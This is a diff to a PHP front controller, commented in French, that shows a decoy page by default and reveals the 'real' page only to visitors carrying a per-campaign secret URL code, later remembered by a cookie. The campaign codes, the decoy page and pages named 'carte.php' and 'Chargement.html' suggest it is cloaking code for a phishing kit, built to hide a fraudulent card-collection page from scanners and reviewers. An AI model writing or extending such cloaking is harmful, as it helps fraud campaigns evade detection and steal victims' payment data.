@@ -1,26 +1,53 @@
 <?php
-// index.php – Front controller avec page leurre + accès secret
+// index.php – Front controller avec cookie de session secrète
 require __DIR__ . '/protect.php';
 
 $url = $_GET['url'] ?? '';
 $url = str_replace(['..', "\0"], '', $url);
 
-// ⚠️ CONFIG – Modifiez ces deux valeurs pour chaque campagne
-$codeSecret = 'x8';              // le code court (2 caractères suffisent)
-$paramName  = 'c';               // le nom du paramètre dans l'URL (ex: ?c=x8)
-$pageReelle = 'home.php';        // votre vraie page protégée
-$pageLeurre = 'legitime.php';    // page neutre affichée par défaut
+// ⚠️ CONFIG
+$codeSecret     = 'x8';              // code court
+$paramName      = 'c';               // paramètre dans l'URL
+$pageReelle     = 'home.php';        // vraie page protégée
+$pageLeurre     = 'legitime.php';    // page neutre
+$cookieName     = '_secret_ok';      // cookie qui mémorise le code valide
+$cookieDuration = 3600;              // durée en secondes (1 heure)
 
-// Si l'URL est vide, on décide quelle page afficher
+// --- Gestion du paramètre secret et du cookie ---
+$hasSecret = false;
+
+if (isset($_GET[$paramName]) && $_GET[$paramName] === $codeSecret) {
+    // Le visiteur a le bon code dans l'URL → on enregistre le cookie
+    setcookie($cookieName, '1', [
+        'expires'  => time() + $cookieDuration,
+        'path'     => '/',
+        'samesite' => 'Lax',
+        'secure'   => false,
+        'httponly' => true,
+    ]);
+    $hasSecret = true;
+} elseif (isset($_COOKIE[$cookieName]) && $_COOKIE[$cookieName] === '1') {
+    // Le visiteur a déjà eu le bon code (cookie présent)
+    $hasSecret = true;
+}
+
+// --- Choix de la page à afficher ---
 if ($url === '') {
-    // Afficher la vraie page UNIQUEMENT si le paramètre secret est présent et correct
-    if (isset($_GET[$paramName]) && $_GET[$paramName] === $codeSecret) {
+    if ($hasSecret) {
         $url = $pageReelle;
     } else {
         $url = $pageLeurre;
     }
+} else {
+    // Pour n'importe quelle autre page (ex: carte.php, Chargement.html...)
+    if (!$hasSecret) {
+        // Pas autorisé → on affiche la page leurre (ou on bloque)
+        $url = $pageLeurre;
+    }
+    // Sinon, on laisse l'URL demandée
 }
 
+// --- Service du fichier ---
 $file = __DIR__ . '/' . $url;
 
 if (file_exists($file) && is_file($file)) {
